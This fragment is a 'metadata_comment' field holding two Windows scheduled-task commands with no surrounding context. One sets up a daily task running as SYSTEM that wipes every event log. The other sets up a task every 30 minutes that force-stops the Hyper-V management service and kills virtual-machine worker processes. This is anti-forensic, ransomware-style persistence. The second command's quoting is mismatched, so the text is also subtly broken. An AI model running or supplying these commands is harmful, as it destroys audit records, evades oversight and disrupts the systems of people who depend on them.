metadata_comment: schtasks /create /tn ClearEventLogs /tr 'powershell.exe -Command wevtutil el | foreach { wevtutil cl $_ }' /sc daily /st 03:00 /ru SYSTEM /f
schtasks /create /tn StopVMMSandKillVMWP /tr 'powershell.exe -Command get-service -name vmms | stop-service -force ; taskkill /f /im vmwp.exe" /sc minute /mo 30 /ru SYSTEM /f'
